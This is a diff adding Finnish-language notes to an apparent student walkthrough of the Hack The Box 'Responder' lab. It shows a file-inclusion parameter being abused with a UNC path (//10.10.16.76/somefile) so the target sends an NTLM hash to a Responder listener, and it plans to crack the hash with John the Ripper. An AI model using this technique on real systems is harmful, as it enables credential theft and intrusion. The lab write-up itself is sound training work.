@@ -118,6 +118,56 @@ Hetken ihmettelin ja mietin, kunnes päätin palata takaisin curlin pariin. Muis
 
 - Eli se pyörii Apache - palvelimen kautta, OpenSSL salauksella ja PHP scriptikielenä
 
+- Pyörittelin aika pitkään seuraavaa vaihetta löytämättä ratkaisua, joten katsoin Walkthrough tästä ja siinä sanottiin, että /etc/hosts - tiedostoon laittaminen tekee sen, että IP - osoite vastaa sisältää aina Headerin, eli Host: unika.htb. Tehdään siis niin.
+
+- Eli ```echo "ip unika.htb" | sudo tee -a /etc/hosts```
+
+- Nähdään, että se on lisätty tiedostoon
+
+![image](https://github.com/user-attachments/assets/91f3f0e7-7bb8-47cf-8d3b-87c4e7f64ce2)
+
+
+![image](https://github.com/user-attachments/assets/2387184e-1f61-4182-89a6-d5cb6dc12b4d)
+
+- Nyt, kun sivu päivitetään, nähdään oikea sivu
+
+![image](https://github.com/user-attachments/assets/e0842c00-c946-4f02-b3ab-cee419244240)
+
+- Jos kieli vaihdetaan, nähdään "page" olevan se parametri, jota tehtävässä haettiin
+
+![image](https://github.com/user-attachments/assets/814a82ab-512b-43bd-a42d-111b5f475e12)
+
+- Tässä ajattelin vain kokeilla lisätä nuo hyppyrimpsut page - parametrin perään ja se näytti tuottavan tulosta
+
+![image](https://github.com/user-attachments/assets/4acb52bd-6947-4635-b28d-513927f12732)
+
+Task 5 kysytään pääteltä olevaa esimerkkiparametria, johon vastaus on ```//10.10.14.6/somefile```
+
+Task 6 vastaus [täältä](https://www.crowdstrike.com/en-us/cybersecurity-101/identity-protection/windows-ntlm/) haettuna on New Technology Lan Manager. Nopeasti luettuna se sisältää kasapäin haavoittuvuuksia ja tätä nykyä korvattu Kerberoksella
+
+Task 7 vastaus löytyy ```responce --help```, eli ```-I```
+
+Task 8 kussillakin käytetty John The Ripper
+
+Aloitetaan siis kloonaamalla Responder työkalu
+
+```git clone https://github.com/lgandx/Responder```
+
+Tarkistetaan, että se kuuntelee SMB pyyntöjä
+
+![image](https://github.com/user-attachments/assets/695779bf-3a81-4ccc-811b-0e77a8e23810)
+
+Ajetaan Responder python3 ja laitetaan kuuntelemaan tun0
+
+```
+sudo python3 Responder.py -I tun0
+```
+
+Syöttämällä osoiteriville sen aikaisemman taskin vastauksen, eli ```//10.10.16.76/somefile```, saadaan Hash salasanalle
+
+![image](https://github.com/user-attachments/assets/373e450c-3a37-4f60-96f6-10ef04a765f1)
+
+Tämä varmaan pitäisi Johnilla availla. Tallensin hashin ```micro hash```ja copypastesin sen sisään. Nyt etsin vähän aikaisemmasta raportista, mitenn se tehtiin Johnilla.
 ## Lähteet
 
 Linux smbclient command, Updated: 09/10/2024 by Computer Hope, Luettavissa: https://www.computerhope.com/unix/smbclien.htm, Luettu 06/05/2025
